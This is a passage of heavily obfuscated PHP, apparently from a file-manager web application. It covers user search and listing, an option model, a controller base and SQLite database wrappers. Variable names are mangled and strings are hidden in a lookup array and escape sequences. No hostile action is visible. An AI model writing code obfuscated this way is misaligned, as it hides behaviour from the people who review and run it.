!1)) { $Óš÷æËÛ[$½÷Ä‚“«] = array($ËìüïÛ§[2325], $‰á¸³£ï[$ËìüïÛ§[874]]); } if (_get($‰á¸³£ï, $ËìüïÛ§[875], !1)) { $õîÛ™å• = array($ËìüïÛ§[2326], $‰á¸³£ï[$ËìüïÛ§[875]]); if ($Óš÷æËÛ[$½÷Ä‚“«]) { $Óš÷æËÛ[$½÷Ä‚“«] = array($Óš÷æËÛ[$½÷Ä‚“«], $õîÛ™å•, $ËìüïÛ§[2327]); } else { $Óš÷æËÛ[$½÷Ä‚“«] = $õîÛ™å•; } } $‰İçÈ› = $this->_makeOrder($¥ÕğàÙ´)->field($ËìüïÛ§[2585])->where($Óš÷æËÛ)->join($İ³ò¿)->selectPage(50); $this->_listDataApply($‰İçÈ›[$ËìüïÛ§[456]]); return $‰İçÈ›; } private function _makeOrder($â±öÏĞ• = '') { $Ô…ú‘Ğû =& $_SERVER[¬ÏÕ§Áú]; $šõªÛ—ê = array($Ô…ú‘Ğû[1837], $Ô…ú‘Ğû[32], $Ô…ú‘Ğû[2026], $Ô…ú‘Ğû[2236], $Ô…ú‘Ğû[1999], $Ô…ú‘Ğû[244]); $ƒ‹í‡© = array($Ô…ú‘Ğû[542] => $Ô…ú‘Ğû[543], $Ô…ú‘Ğû[544] => $Ô…ú‘Ğû[545]); $ÕŒÃæ”µ = Input::get($Ô…ú‘Ğû[549], $Ô…ú‘Ğû[7], $Ô…ú‘Ğû[1828], $šõªÛ—ê); $°Àõş©Ô = Input::get($Ô…ú‘Ğû[550], $Ô…ú‘Ğû[7], $Ô…ú‘Ğû[2132], array($Ô…ú‘Ğû[2132], $Ô…ú‘Ğû[544])); $°Àõş©Ô = $ƒ‹í‡©[$°Àõş©Ô]; $â±öÏĞ• = $â±öÏĞ• . "\165\163\145\x72\56{$ÕŒÃæ”µ}\40{$°Àõş©Ô}\x2c\x20\165\x73\x65\162\x2e\x75\163\x65\x72\x49\104\x20\141\x73\x63"; return $this->alias($Ô…ú‘Ğû[2272])->order($â±öÏĞ•); } public function listSearch($‰ÙÁÍÕ) { $ëÜ´¾Í¨ =& $_SERVER[¬ÏÕ§Áú]; $“Õâäˆ‚ = trim($‰ÙÁÍÕ[$ëÜ´¾Í¨[2135]]); $ÜÒ•İÌ¡ = explode($ëÜ´¾Í¨[53], $“Õâäˆ‚); if (!$“Õâäˆ‚ || count($ÜÒ•İÌ¡) == 1) { return $this->listSearchNow($‰ÙÁÍÕ); } $¹¥°—ìô = array($ëÜ´¾Í¨[456] => array()); foreach ($ÜÒ•İÌ¡ as $ÎğıŠ) { if (!trim($ÎğıŠ)) { continue; } $‰ÙÁÍÕ[$ëÜ´¾Í¨[2135]] = $ÎğıŠ; $Ì¨üÆáù = $this->listSearchNow($‰ÙÁÍÕ); $¹¥°—ìô[$ëÜ´¾Í¨[456]] = array_merge($¹¥°—ìô[$ëÜ´¾Í¨[456]], $Ì¨üÆáù[$ëÜ´¾Í¨[456]]); } $¹¥°—ìô[$ëÜ´¾Í¨[456]] = array_unique_by_key($¹¥°—ìô[$ëÜ´¾Í¨[456]], $ëÜ´¾Í¨[1837]); $¹¥°—ìô[$ëÜ´¾Í¨[453]] = array($ëÜ´¾Í¨[454] => count($¹¥°—ìô[$ëÜ´¾Í¨[456]]), $ëÜ´¾Í¨[450] => 20, $ëÜ´¾Í¨[439] => 1, $ëÜ´¾Í¨[455] => 1); return $¹¥°—ìô; } public function listSearchNow($òÂ°ŒÃ) { $Îİ«ÜöÚ =& $_SERVER[¬ÏÕ§Áú]; $¹òº¯” = trim($òÂ°ŒÃ[$Îİ«ÜöÚ[2135]]); $ú€˜µ¾ = isset($òÂ°ŒÃ[$Îİ«ÜöÚ[2136]]) ? $òÂ°ŒÃ[$Îİ«ÜöÚ[2136]] : !1; $¹òº¯” = str_replace($Îİ«ÜöÚ[2137], $Îİ«ÜöÚ[2138], trim($¹òº¯”)); $Øº±¯ÚÇ = array($Îİ«ÜöÚ[32] => array($Îİ«ÜöÚ[479], "\45{$¹òº¯”}\x25"), $Îİ«ÜöÚ[391] => array($Îİ«ÜöÚ[479], "{$¹òº¯”}\45"), $Îİ«ÜöÚ[2344] => array($Îİ«ÜöÚ[479], "\x25{$¹òº¯”}\45"), $Îİ«ÜöÚ[1125] => $Îİ«ÜöÚ[2139]); if (Input::check($¹òº¯”, $Îİ«ÜöÚ[397])) { $Øº±¯ÚÇ[$Îİ«ÜöÚ[1837]] = array($Îİ«ÜöÚ[479], "{$¹òº¯”}\45"); $Øº±¯ÚÇ[$Îİ«ÜöÚ[2565]] = array($Îİ«ÜöÚ[479], "{$¹òº¯”}\45"); } if (!$¹òº¯”) { $Øº±¯ÚÇ = array(); } if (isset($òÂ°ŒÃ[$Îİ«ÜöÚ[863]])) { $Øº±¯ÚÇ[$Îİ«ÜöÚ[863]] = $òÂ°ŒÃ[$Îİ«ÜöÚ[863]]; } $Øº±¯ÚÇ = $this->parseWhereLike($Øº±¯ÚÇ); $ÀŠóô¾˜ = $this->_makeOrder()->where($Øº±¯ÚÇ)->selectPage(20); if (!$ÀŠóô¾˜ || count($ÀŠóô¾˜[$Îİ«ÜöÚ[456]]) < 5 && Input::check($¹òº¯”, $Îİ«ÜöÚ[404])) { $×ªƒü › = $this->_searchFromMeta($Îİ«ÜöÚ[556], $¹òº¯”, 10); $€ÏÃ°¹† = $this->_searchFromMeta($Îİ«ÜöÚ[557], $¹òº¯”, 10); $Á»ï€½¢ = array_merge($×ªƒü ›, $€ÏÃ°¹†, $ÀŠóô¾˜[$Îİ«ÜöÚ[456]]); $ÀŠóô¾˜[$Îİ«ÜöÚ[456]] = array_unique_by_key($Á»ï€½¢, $Îİ«ÜöÚ[1837]); $ÀŠóô¾˜[$Îİ«ÜöÚ[453]][$Îİ«ÜöÚ[454]] = count($ÀŠóô¾˜[$Îİ«ÜöÚ[456]]); $ÀŠóô¾˜[$Îİ«ÜöÚ[453]][$Îİ«ÜöÚ[455]] = ceil($ÀŠóô¾˜[$Îİ«ÜöÚ[453]][$Îİ«ÜöÚ[454]] / $ÀŠóô¾˜[$Îİ«ÜöÚ[453]][$Îİ«ÜöÚ[450]]); } $this->_listDataApply($ÀŠóô¾˜[$Îİ«ÜöÚ[456]]); $this->_filterByGroup($ÀŠóô¾˜, $ú€˜µ¾); return $ÀŠóô¾˜; } private function _filterByGroup(&$ˆ–ôßˆ‡, $‡éşàƒ) { $¡œı¢‰× =& $_SERVER[¬ÏÕ§Áú]; if (!$‡éşàƒ) { return $ˆ–ôßˆ‡; } foreach ($ˆ–ôßˆ‡[$¡œı¢‰×[456]] as $™ªİÒ¡í => &$ìï†«—¦) { $º²ÑæÜì = array_to_keyvalue($ìï†«—¦[$¡œı¢‰×[1444]], $¡œı¢‰×[12], $¡œı¢‰×[1445]); if (!in_array($‡éşàƒ, $º²ÑæÜì)) { unset($ˆ–ôßˆ‡[$¡œı¢‰×[456]][$™ªİÒ¡í]); } } unset($ìï†«—¦); $ˆ–ôßˆ‡[$¡œı¢‰×[456]] = array_values($ˆ–ôßˆ‡[$¡œı¢‰×[456]]); $ˆ–ôßˆ‡[$¡œı¢‰×[453]] = array($¡œı¢‰×[2308] => count($ˆ–ôßˆ‡[$¡œı¢‰×[456]]), $¡œı¢‰×[2306] => $ˆ–ôßˆ‡[$¡œı¢‰×[453]][$¡œı¢‰×[450]], $¡œı¢‰×[2305] => 1, $¡œı¢‰×[2307] => 1); } private function _searchFromMeta($’™¸æî¤, $¼Ôâ¯Æ, $äÇ®˜Ï) { $ã‘Åıâ =& $_SERVER[¬ÏÕ§Áú]; $¼Ôâ¯Æ = strtolower($¼Ôâ¯Æ); $Œ¹¦Ñ‚Ñ = array($ã‘Åıâ[107] => $’™¸æî¤, $ã‘Åıâ[461] => array($ã‘Åıâ[479], "\45{$¼Ôâ¯Æ}\45")); $Œ¹¦Ñ‚Ñ = $this->parseWhereLike($Œ¹¦Ñ‚Ñ); $»‡ÁÀÔ² = Model($ã‘Åıâ[2586])->where($Œ¹¦Ñ‚Ñ)->limit($äÇ®˜Ï)->select(); if (!$»‡ÁÀÔ²) { return array(); } $»‡ÁÀÔ² = array_to_keyvalue($»‡ÁÀÔ², $ã‘Åıâ[12], $ã‘Åıâ[1837]); $Ù²º»×ø = $this->where(array($ã‘Åıâ[1828] => array($ã‘Åıâ[7], $»‡ÁÀÔ²)))->select(); if (!$Ù²º»×ø) { return array(); } return $Ù²º»×ø; } private function _listDataApplyItem($Ğíæ–ÎŒ) { $—ÈÛ§¼€ = array($Ğíæ–ÎŒ); $this->_listDataApply($—ÈÛ§¼€); return $—ÈÛ§¼€[0]; } private function _listDataApply(&$·…ÈŞğ†) { $À±Îƒëı =& $_SERVER[¬ÏÕ§Áú]; if (!$·…ÈŞğ†) { return; } array_remove_key($·…ÈŞğ†, $À±Îƒëı[1011]); $Ï¼‰í§ = array_to_keyvalue($·…ÈŞğ†, $À±Îƒëı[12], $À±Îƒëı[1837]); $this->_listAppendGroup($·…ÈŞğ†, $Ï¼‰í§); $this->_listAppendMeta($·…ÈŞğ†, $Ï¼‰í§); $this->_listAppendSourceRoot($·…ÈŞğ†, $Ï¼‰í§); } private function _listAppendSourceRoot(&$¶öû•”’, $æÊŸ¿à) { $½ãùÖÔ =& $_SERVER[¬ÏÕ§Áú]; $üûæ¼†É = Model($½ãùÖÔ[946])->listSourceRoot(SourceModel::TYPE_USER, $æÊŸ¿à); $üûæ¼†É = array_to_keyvalue($üûæ¼†É, $½ãùÖÔ[590]); $üûæ¼†É = array_remove_key($üûæ¼†É, $½ãùÖÔ[590]); foreach ($¶öû•”’ as &$ƒÏ­éı±) { $ƒÏ­éı±[$½ãùÖÔ[100]] = $üûæ¼†É[$ƒÏ­éı±[$½ãùÖÔ[1837]]] ? $üûæ¼†É[$ƒÏ­éı±[$½ãùÖÔ[1837]]] : array(); } unset($ƒÏ­éı±); } private function _listAppendGroup(&$›¯Ì¤›Ä, $€’‡¼ğ¤) { $Œ¡¹ÒŸÛ =& $_SERVER[¬ÏÕ§Áú]; $­œÅ¡Ñè = array($Œ¡¹ÒŸÛ[1837] => array($Œ¡¹ÒŸÛ[7], $€’‡¼ğ¤)); $ä•Æô“ê = Model($Œ¡¹ÒŸÛ[2131])->where($­œÅ¡Ñè)->select(); $éğËË¯ò = array_to_keyvalue($ä•Æô“ê, $Œ¡¹ÒŸÛ[12], $Œ¡¹ÒŸÛ[1445]); $éğËË¯ò = array_remove_value(array_unique($éğËË¯ò), $Œ¡¹ÒŸÛ[241]); if (!$éğËË¯ò || !$ä•Æô“ê) { return; } $­œÅ¡Ñè = array($Œ¡¹ÒŸÛ[1445] => array($Œ¡¹ÒŸÛ[7], $éğËË¯ò)); $ûÀôœ´» = Model($Œ¡¹ÒŸÛ[1443])->field($Œ¡¹ÒŸÛ[2587])->where($­œÅ¡Ñè)->select(); $ûÀôœ´» = array_to_keyvalue($ûÀôœ´», $Œ¡¹ÒŸÛ[1445]); $ä•Æô“ê = array_to_keyvalue_group($ä•Æô“ê, $Œ¡¹ÒŸÛ[1837]); foreach ($ä•Æô“ê as &$âæí‰¬­) { $ƒ£™˜áŠ = array(); foreach ($âæí‰¬­ as $ùÚÛ¢å–) { if (!$ùÚÛ¢å–[$Œ¡¹ÒŸÛ[2145]]) { continue; } $€†ßÃƒ = Model($Œ¡¹ÒŸÛ[592])->listData($ùÚÛ¢å–[$Œ¡¹ÒŸÛ[2145]]); $ƒ£™˜áŠ[] = array($Œ¡¹ÒŸÛ[1445] => $ùÚÛ¢å–[$Œ¡¹ÒŸÛ[1445]], $Œ¡¹ÒŸÛ[2588] => $ûÀôœ´»[$ùÚÛ¢å–[$Œ¡¹ÒŸÛ[1445]]][$Œ¡¹ÒŸÛ[32]], $Œ¡¹ÒŸÛ[605] => $ûÀôœ´»[$ùÚÛ¢å–[$Œ¡¹ÒŸÛ[1445]]][$Œ¡¹ÒŸÛ[605]], $Œ¡¹ÒŸÛ[507] => $€†ßÃƒ); } $âæí‰¬­ = $ƒ£™˜áŠ; } unset($âæí‰¬­); foreach ($›¯Ì¤›Ä as &$ÄäÀÛ„ƒ) { $ÄäÀÛ„ƒ[$Œ¡¹ÒŸÛ[1444]] = array(); if (isset($ä•Æô“ê[$ÄäÀÛ„ƒ[$Œ¡¹ÒŸÛ[1837]]])) { $ÄäÀÛ„ƒ[$Œ¡¹ÒŸÛ[1444]] = $ä•Æô“ê[$ÄäÀÛ„ƒ[$Œ¡¹ÒŸÛ[1837]]]; } } unset($ÄäÀÛ„ƒ); } public function userAppendGroup($âú‘”±¤) { $Ì‚˜ü²¹ =& $_SERVER[¬ÏÕ§Áú]; if (!$âú‘”±¤) { return array(); } $this->_listAppendGroup($âú‘”±¤, array_to_keyvalue($âú‘”±¤, $Ì‚˜ü²¹[12], $Ì‚˜ü²¹[1837])); return $âú‘”±¤; } private function _listAppendMeta(&$ˆ±Üúì­, $ÔÇ¼Ô²À) { $‹Ï»€‹ö =& $_SERVER[¬ÏÕ§Áú]; $–ƒåà·¨ = UserJobModel::JOB_KEY; $÷ÜÈë—Ø = array($‹Ï»€‹ö[2129]); $•·ñŠ©¿ = array($‹Ï»€‹ö[1837] => array($‹Ï»€‹ö[7], $ÔÇ¼Ô²À)); $³ŸˆŞï´ = Model($‹Ï»€‹ö[2564])->where($•·ñŠ©¿)->select(); $ìÍŸ³¹… = array(); foreach ($³ŸˆŞï´ as $›°î²è) { $²”ÛàÓ· = $›°î²è[$‹Ï»€‹ö[1837]]; if (!isset($ìÍŸ³¹…[$²”ÛàÓ·])) { $ìÍŸ³¹…[$²”ÛàÓ·] = array(); } $ìÍŸ³¹…[$²”ÛàÓ·][$›°î²è[$‹Ï»€‹ö[107]]] = $›°î²è[$‹Ï»€‹ö[461]]; } $½¥Å·Ñğ = Model($‹Ï»€‹ö[2589]); foreach ($ˆ±Üúì­ as &$«İé¸àö) { $²”ÛàÓ· = $«İé¸àö[$‹Ï»€‹ö[1837]]; $Æ¹›º›¸ = isset($ìÍŸ³¹…[$²”ÛàÓ·]) ? $ìÍŸ³¹…[$²”ÛàÓ·] : array(); $«İé¸àö[$‹Ï»€‹ö[560]] = array_field_key($Æ¹›º›¸, $÷ÜÈë—Ø); $«İé¸àö[$‹Ï»€‹ö[2590]] = array(); if (isset($Æ¹›º›¸[$–ƒåà·¨])) { $«İé¸àö[$‹Ï»€‹ö[2590]] = $½¥Å·Ñğ->getUserJobInfo($Æ¹›º›¸[$–ƒåà·¨]); } } unset($«İé¸àö); } protected function groupUserAll($¤«¢Æ¥Ğ) { $ãŠ§ãŸ¤ =& $_SERVER[¬ÏÕ§Áú]; if (!$¤«¢Æ¥Ğ) { return !1; } $±ç³¯ïí = Model($ãŠ§ãŸ¤[2131])->field($ãŠ§ãŸ¤[1837])->where(array($ãŠ§ãŸ¤[1445] => array($ãŠ§ãŸ¤[7], $¤«¢Æ¥Ğ)))->select(); $±ç³¯ïí = array_to_keyvalue($±ç³¯ïí, $ãŠ§ãŸ¤[12], $ãŠ§ãŸ¤[1837]); return array_unique($±ç³¯ïí); } public function userSearch($¦·ŸÌšÅ, $¢»ŠöÌµ = "\52") { return Model($_SERVER[¬ÏÕ§Áú][618])->where($¦·ŸÌšÅ)->field($¢»ŠöÌµ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\137\157\160\164\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ä ìÉĞÙ) { return "\125\x73\x65\x72\x4f\160\164\151\157\156\137{$ä ìÉĞÙ}\137" . KodUser::id(); } protected function filterWhere($ÀıÇÜ­Œ) { $ÀıÇÜ­Œ[$_SERVER[¬ÏÕ§Áú][1837]] = KodUser::id(); return $ÀıÇÜ­Œ; } public function cacheRemoveUser($±¬ÃÍ¾Ã, $Â±ªŞ) { return Cache::remove("\x55\x73\x65\x72\x4f\x70\x74\151\157\x6e\137{$±¬ÃÍ¾Ã}\x5f" . $Â±ªŞ); } protected function optionDefault($Ôî¶—ñÛ = '') { $æÃÀåè =& $_SERVER[¬ÏÕ§Áú]; if ($Ôî¶—ñÛ == $æÃÀåè[12]) { return $GLOBALS[$æÃÀåè[6]][$æÃÀåè[2591]]; } if ($Ôî¶—ñÛ == $æÃÀåè[2592]) { return $GLOBALS[$æÃÀåè[6]][$æÃÀåè[2593]]; } } } goto AŒ¾Í©œè; BæˆÀŸ…ò£: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¥­¸œÚÆ =& $_SERVER[¬ÏÕ§Áú]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¥­¸œÚÆ[6]] =& $config; $this->values[$¥­¸œÚÆ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¥­¸œÚÆ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ŸÈ¢³®) { if (1 === func_num_args()) { $this->{$ŸÈ¢³®} = new $ŸÈ¢³®(); } else { $Ó¾‡î = new ReflectionClass($ŸÈ¢³®); $˜Ù÷íü¼ = func_get_args(); array_shift($˜Ù÷íü¼); $this->{$ŸÈ¢³®} = $Ó¾‡î->newInstanceArgs($˜Ù÷íü¼); } return $this->{$ŸÈ¢³®}; } public function routeBind($³Í¡†Éß, $îÒ´¨Ç, $æÏş‰‹ = 3) { $£İÏšÄœ =& $_SERVER[¬ÏÕ§Áú]; $öº¿Â‰÷ = $this->in[$£İÏšÄœ[9]]; $³Í¡†Éß = str_replace($£İÏšÄœ[10], $£İÏšÄœ[11], trim(trim($³Í¡†Éß, $£İÏšÄœ[8]), $£İÏšÄœ[12])); if (!$³Í¡†Éß || count($öº¿Â‰÷) <= $æÏş‰‹) { return !1; } $¾±¬Ñ½ = !0; $ª‰£‰ê = explode($£İÏšÄœ[8], $³Í¡†Éß); for ($ÕâÒ¡“ = 0; $ÕâÒ¡“ < count($ª‰£‰ê); $ÕâÒ¡“++) { if ($ª‰£‰ê[$ÕâÒ¡“] != $öº¿Â‰÷[$æÏş‰‹ + $ÕâÒ¡“]) { $¾±¬Ñ½ = !1; break; } } if (!$¾±¬Ñ½) { return; } call_user_func_array(array($this, $îÒ´¨Ç), array()); } public function routeArgs($„ÙÉö•¬ = 3) { $ìê‡–É¬ = $this->in[$_SERVER[¬ÏÕ§Áú][9]]; if (count($ìê‡–É¬) <= $„ÙÉö•¬) { return array(); } $Š¯Ã°¯æ = array(); for ($ñçã‚·¹ = $„ÙÉö•¬; $ñçã‚·¹ < count($ìê‡–É¬); $ñçã‚·¹ += 2) { $Š¯Ã°¯æ[$ìê‡–É¬[$ñçã‚·¹]] = $ìê‡–É¬[$ñçã‚·¹ + 1]; $this->in[$ìê‡–É¬[$ñçã‚·¹]] = $ìê‡–É¬[$ñçã‚·¹ + 1]; } return $Š¯Ã°¯æ; } protected function assign($üè¬¦†‘, $…äÔ¥° ) { $this->values[$üè¬¦†‘] = $…äÔ¥° ; } protected function display($åüÆ…—) { ob_end_clean(); extract($this->values); require $this->tpl . $åüÆ…—; } } class DbSqliteBase extends Db { public function __construct($Ğ¨É¢Øº = '') { $ëü¬†¬ä =& $_SERVER[¬ÏÕ§Áú]; if (!extension_loaded($ëü¬†¬ä[13])) { think_exception(think_lang($ëü¬†¬ä[14]) . $ëü¬†¬ä[15]); } if (!empty($Ğ¨É¢Øº)) { if (!isset($Ğ¨É¢Øº[$ëü¬†¬ä[16]])) { $Ğ¨É¢Øº[$ëü¬†¬ä[16]] = 438; } $this->config = $Ğ¨É¢Øº; if (empty($this->config[$ëü¬†¬ä[17]])) { $this->config[$ëü¬†¬ä[17]] = array(); } } } public function connect($„ÚË¹¡Í = '', $ºà²ªì… = 0) { $ˆı–¿ê¶ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($this->linkID[$ºà²ªì…])) { if (empty($„ÚË¹¡Í)) { $„ÚË¹¡Í = $this->config; } $‰â ‹É = !empty($„ÚË¹¡Í[$ˆı–¿ê¶[17]][$ˆı–¿ê¶[18]]) ? $„ÚË¹¡Í[$ˆı–¿ê¶[17]][$ˆı–¿ê¶[18]] : $this->pconnect; $²öÏŞÍ² = $‰â ‹É ? $ˆı–¿ê¶[19] : $ˆı–¿ê¶[20]; $this->linkID[$ºà²ªì…] = $²öÏŞÍ²($„ÚË¹¡Í[$ˆı–¿ê¶[21]], $„ÚË¹¡Í[$ˆı–¿ê¶[16]]); if (!$this->linkID[$ºà²ªì…]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ºà²ªì…], 30000); if (1 != think_config($ˆı–¿ê¶[22])) { unset($this->config); } } return $this->linkID[$ºà²ªì…]; } public function free() { $this->queryID = null; } public function query($È¡ü«¯) { $‘ïÜõØ =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $È¡ü«¯; if ($this->queryID) { $this->free(); } think_action_status($‘ïÜõØ[23], 1); think_status($‘ïÜõØ[24]); $this->queryID = sqlite_query($this->_linkID, $È¡ü«¯); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ã•ë½Ò = $this->getAll(); return $Ã•ë½Ò; } } public function execute($ÇŞ—Íéœ) { $Œ©¶ÕÙ¦ =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÇŞ—Íéœ; if ($this->queryID) { $this->free(); } think_action_status($Œ©¶ÕÙ¦[25], 1); think_status($Œ©¶ÕÙ¦[24]); $í›Ãé = sqlite_exec($this->_linkID, $ÇŞ—Íéœ); $this->debug(); if (!1 === $í›Ãé) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¬ÏÕ§Áú][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¹ş°§ñâ = sqlite_query($this->_linkID, $_SERVER[¬ÏÕ§Áú][27]); if (!$¹ş°§ñâ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $İ¹ÛõĞ² = sqlite_query($this->_linkID, $_SERVER[¬ÏÕ§Áú][28]); if (!$İ¹ÛõĞ²) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¡µİ°´ = array(); if ($this->numRows > 0) { for ($‚Ğ‰½Ê¾ = 0; $‚Ğ‰½Ê¾ < $this->numRows; $‚Ğ‰½Ê¾++) { $¡µİ°´[$‚Ğ‰½Ê¾] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¡µİ°´; } public function getFields($¨áªü¡) { $Ü» ùäù =& $_SERVER[¬ÏÕ§Áú]; $‚¨˜ô¡ø = $this->query($Ü» ùäù[29] . $¨áªü¡ . $Ü» ùäù[30]); $ÂÊà·İÚ = array(); if ($‚¨˜ô¡ø) { foreach ($‚¨˜ô¡ø as $±”İé°ß => $“½ÖĞ) { $ÂÊà·İÚ[$“½ÖĞ[$Ü» ùäù[31]]] = array($Ü» ùäù[32] => $“½ÖĞ[$Ü» ùäù[31]], $Ü» ùäù[33] => $“½ÖĞ[$Ü» ùäù[34]], $Ü» ùäù[35] => (bool) ($“½ÖĞ[$Ü» ùäù[36]] === $Ü» ùäù[12]), $Ü» ùäù[37] => $“½ÖĞ[$Ü» ùäù[38]], $Ü» ùäù[39] => strtolower($“½ÖĞ[$Ü» ùäù[40]]) == $Ü» ùäù[41], $Ü» ùäù[42] => strtolower($“½ÖĞ[$Ü» ùäù[43]]) == $Ü» ùäù[44]); } } return $ÂÊà·İÚ; } public function getTables($Ê²›ÉÙ = '') { $ƒÈÈ³èÏ =& $_SERVER[¬ÏÕ§Áú]; $Åœ†üòİ = $this->query($ƒÈÈ³èÏ[45] . $ƒÈÈ³èÏ[46] . $ƒÈÈ³èÏ[47]); $´Ñ˜äÀÛ = array(); foreach ($Åœ†üòİ as $ëúæÉôí => $§Ñ·áÅ) { $´Ñ˜äÀÛ[$ëúæÉôí] = current($§Ñ·áÅ); } return $´Ñ˜äÀÛ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ôøú¹’» =& $_SERVER[¬ÏÕ§Áú]; $‡Î²÷“¨ = sqlite_last_error($this->_linkID); $this->error = $‡Î²÷“¨ . $Ôøú¹’»[4] . sqlite_error_string($‡Î²÷“¨); if ($Ôøú¹’»[12] != $this->queryStr) { $this->error .= LNG($Ôøú¹’»[48]) . $this->queryStr; } think_trace($this->error, $Ôøú¹’»[12], $Ôøú¹’»[49]); return $this->error; } public function escapeString($¾Õçâ¼Õ) { return sqlite_escape_string($¾Õçâ¼Õ); } public function parseLimit($æıËüÅ•) { $ªé»Àá‘ =& $_SERVER[¬ÏÕ§Áú]; $èæõëŠÖ = $ªé»Àá‘[12]; if (!empty($æıËüÅ•)) { $æıËüÅ• = explode($ªé»Àá‘[50], $æıËüÅ•); if (count($æıËüÅ•) > 1) { $èæõëŠÖ .= $ªé»Àá‘[51] . $æıËüÅ•[1] . $ªé»Àá‘[52] . $æıËüÅ•[0] . $ªé»Àá‘[53]; } else { $èæõëŠÖ .= $ªé»Àá‘[51] . $æıËüÅ•[0] . $ªé»Àá‘[53]; } } return $èæõëŠÖ; } } class DbSqlite3Base extends Db { public function __construct($úù¼æÓÑ = '') { $¦­î¶Ó =& $_SERVER[¬ÏÕ§Áú]; if (!class_exists($¦­î¶Ó[54])) { think_exception(think_lang($¦­î¶Ó[14]) . $¦­î¶Ó[55]); } if (!empty($úù¼æÓÑ)) { if (!isset($úù¼æÓÑ[$¦­î¶Ó[16]])) { $úù¼æÓÑ[$¦­î¶Ó[16]] = 438; } $this->config = $úù¼æÓÑ; if (empty($this->config[$¦­î¶Ó[17]])) { $this->config[$¦­î¶Ó[17]] = array(); } } } public function connect($Üá‚Ì¢º = '', $´ƒ¤î¥ = 0) { $ŞâÛıû =& $_SERVER[¬ÏÕ§Áú]; if (!isset($this->linkID[$´ƒ¤î¥])) { if (empty($Üá‚Ì¢º)) { $Üá‚Ì¢º = $this->config; } $this->linkID[$´ƒ¤î¥] = new SQLite3($Üá‚Ì¢º[$ŞâÛıû[21]]); if (!$this->linkID[$´ƒ¤î¥]) { think_exception($this->linkID[$´ƒ¤î¥]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$´ƒ¤î¥]->busyTimeout(30000); if (1 != think_config($ŞâÛıû[22])) { unset($this->config); } } return $this->linkID[$´ƒ¤î¥]; } public function free() { $this->queryID = null; } public function query($£‚û¼ë—) { $Äâù„ó… =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $£‚û¼ë—; if ($this->queryID) { $this->free(); } think_action_status($Äâù„ó…[23], 1); think_status($Äâù„ó…[24]); $this->queryID = $this->_linkID->query($£‚û¼ë—); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ãúÑ’‡Ì = $this->getAll(); $this->numRows = count($ãúÑ’‡Ì); return $ãúÑ’‡Ì; } } public function execute($¸îÎ¼™±) { $™‡Öìä„ =& $_SERVER[¬ÏÕ§Áú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¸îÎ¼™±; if ($this->queryID) { $this->free(); } think_action_status($™‡Öìä„[25], 1); think_status($™‡Öìä„[24]); $€Ç¥ëˆÃ = $this->_linkID->exec($¸îÎ¼™±); $this->debug(); if (!1 === $€Ç¥ëˆÃ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¬ÏÕ§Áú][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‚£³€¾¯ = $this->_linkID->query($_SERVER[¬ÏÕ§Áú][27]); if (!$‚£³€¾¯) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Â£’˜ÇÂ = $this->_linkID->query($_SERVER[¬ÏÕ§Áú][28]); if (!$Â£’˜ÇÂ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ª‡ŒÄ³ü = array(); while ($Äöì§ ñ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ª‡ŒÄ³ü[] = $Äöì§ ñ; } $this->queryID->reset(); return $ª‡ŒÄ³ü; } public function getFields($¯Û©Ñ›) { $Á¼æ”Â½ =& $_SERVER[¬ÏÕ§Áú]; $¾±ë©¯ = $this->query($Á¼æ”Â½[29] . $¯Û©Ñ› . $Á¼æ”Â½[30]); $µÇşÛñ = array(); if ($¾±ë©¯) { foreach ($¾±ë©¯ as $“ã†‹Ä„ => $µñ¥Œµª) { $µÇşÛñ[$µñ¥Œµª[$Á¼æ”Â½[32]]] = array($Á¼æ”Â½[32] => $µñ¥Œµª[$Á¼æ”Â½[32]], $Á¼æ”Â½[33] => $µñ¥Œµª[$Á¼æ”Â½[33]], $Á¼æ”Â½[35] => (bool) ($µñ¥Œµª[$Á¼æ”Â½[35]] === $Á¼æ”Â½[12]), $Á¼æ”Â½[37] => $µñ¥Œµª[$Á¼æ”Â½[56]], $Á¼æ”Â½[39] => (bool) $µñ¥Œµª[$Á¼æ”Â½[57]], $Á¼æ”Â½[42] => (bool) 